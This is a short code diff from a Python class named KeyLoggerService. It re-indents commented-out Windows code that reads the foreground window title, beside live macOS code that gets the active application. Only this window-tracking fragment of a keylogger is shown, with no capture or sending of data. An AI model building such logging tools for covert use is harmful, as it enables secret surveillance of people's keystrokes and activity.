@@ -48,8 +48,8 @@ class KeyLoggerService:
     @staticmethod
     def get_active_application():
         # if platform.system() == "Windows": # Windows
-        # hwnd = win32gui.GetForegroundWindow() # Windows
-        # return win32gui.GetWindowText(hwnd) or "Unknown" # Windows
+        #     hwnd = win32gui.GetForegroundWindow() # Windows
+        #     return win32gui.GetWindowText(hwnd) or "Unknown" # Windows
 
         if platform.system() == "Darwin": # macOS
             active_app = NSWorkspace.sharedWorkspace().activeApplication() # macOS
